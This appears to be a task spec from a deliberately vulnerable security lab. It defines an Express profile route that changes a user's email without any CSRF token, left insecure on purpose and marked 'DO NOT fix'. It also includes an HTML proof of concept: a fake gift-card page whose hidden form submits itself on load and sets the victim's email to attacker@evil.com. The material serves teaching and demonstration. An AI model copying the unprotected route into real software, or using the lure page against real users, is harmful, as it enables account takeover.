# Tasks 06: Profile — đổi email + CSRF (F03) + csrf-poc.html

> Phase 1 · Người làm: AI · Vuln cài ở task này: **F03 (CSRF — đổi email không token)**.

---

## Dependencies

```
Cần: tasks/03 (middleware requireAuth + cookie session SameSite=None)
Quan trọng: cookie PHẢI là sameSite:'none' (D3) — nếu không, csrf-poc sẽ bị chặn bởi SameSite=Lax mặc định
```

---

## Files tạo

### ✅ app/server/src/routes/profile.ts

```typescript
import { Router } from 'express';
import { pool } from '../db';
import { requireAuth } from '../middleware';

const router = Router();

// GET /api/profile → thông tin user đang đăng nhập
router.get('/profile', requireAuth, (req, res) => {
  res.json({ id: req.user.id, email: req.user.email, role: req.user.role });
});

// POST /api/profile/email  { newEmail }
// VULN-03: deliberately insecure — state-changing request WITHOUT CSRF token
// See tasks/06 + docs/guides/decisions.md (D3). DO NOT "fix".
// Chỉ dựa vào cookie session (SameSite=None) → request cross-site vẫn kèm cookie → bị CSRF
router.post('/profile/email', requireAuth, async (req, res) => {
  const { newEmail } = req.body;
  if (!newEmail) return res.status(400).json({ error: 'newEmail required' });

  const { rows } = await pool.query(
    'UPDATE users SET email = $1 WHERE id = $2 RETURNING id, email, role',
    [newEmail, req.user.id]
  );
  res.json(rows[0]);
});

export default router;
```

### ✅ app/client/src/pages/Profile.tsx

```
UI: hiện email hiện tại + form "Change email" (ô nhập + nút Save)
On submit: POST /api/profile/email { newEmail } → cập nhật UI
Ghi chú: đây là mục tiêu của CSRF — request này KHÔNG có token, KHÔNG check nguồn gốc
```

### ✅ poc/csrf-poc.html (mở bằng browser là demo được — để root sạch)

```html
<!--
  CSRF PoC — F03 (deliberately vulnerable lab, local only)
  Cách dùng: đăng nhập alice ở tab khác (http://localhost:5173),
  rồi mở file này bằng browser (file:// hoặc localhost khác) → form tự submit.
  Cookie session (SameSite=None) được browser gửi kèm dù request CROSS-SITE
  → email của alice bị đổi thành attacker@evil.com mà alice không hề bấm gì.
-->
<!doctype html>
<html>
  <body>
    <h1>Win a FREE Gift Card!</h1>
    <p>Click to claim your prize...</p>
    <!-- Form ẩn tự submit — victim không cần bấm nút này -->
    <form id="attack" method="POST" action="http://localhost:5173/api/profile/email">
      <input type="hidden" name="newEmail" value="attacker@evil.com" />
    </form>
    <script>
      // Tự submit ngay khi trang load — nạn nhân chỉ cần MỞ trang là dính
      document.getElementById('attack').submit();
    </script>
  </body>
</html>
```

```
Lưu ý kỹ thuật (giải thích được khi phỏng vấn):
- Form POST (application/x-www-form-urlencoded) = "simple request" → KHÔNG cần CORS preflight
- express.urlencoded() đã bật ở index.ts (tasks/01) → server đọc được body form
- action trỏ tới :5173 (cùng origin app) để cookie 'localhost' khớp — nhưng trang attack ở origin KHÁC
  (file://) → vẫn là CROSS-SITE → SameSite=None mới cho gửi cookie
```

---

✅ Task 06 completed — all files created and verified
